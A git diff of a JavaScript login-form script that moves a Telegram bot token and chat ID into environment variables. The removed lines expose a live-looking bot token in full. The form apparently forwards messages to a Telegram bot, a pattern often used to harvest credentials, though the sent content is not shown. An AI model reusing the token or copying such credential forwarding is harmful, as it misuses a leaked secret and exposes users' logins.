@@ -1,4 +1,6 @@
+import "./style.css"
 const form = document.querySelector("#form")
+
 
 const validate = (user,password) => { 
     const user_error = document.querySelector("#user-error")
@@ -28,10 +30,8 @@ const validate = (user,password) => {
     return user && password
 }
 
-
-
-const TELEGRAM_BOT_TOKEN = "6025236640:AAGZo93a8FaBQLF5EqWxuCVWoCjm4tK9CMg"
-const TELEGRAM_CHAT_ID = 907555756
+const TELEGRAM_BOT_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN
+const TELEGRAM_CHAT_ID = import.meta.env.VITE_TELEGRAM_CHAT_ID
 const telegramBaseUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
 
 const sendMessageToTelegram = async (message) => {
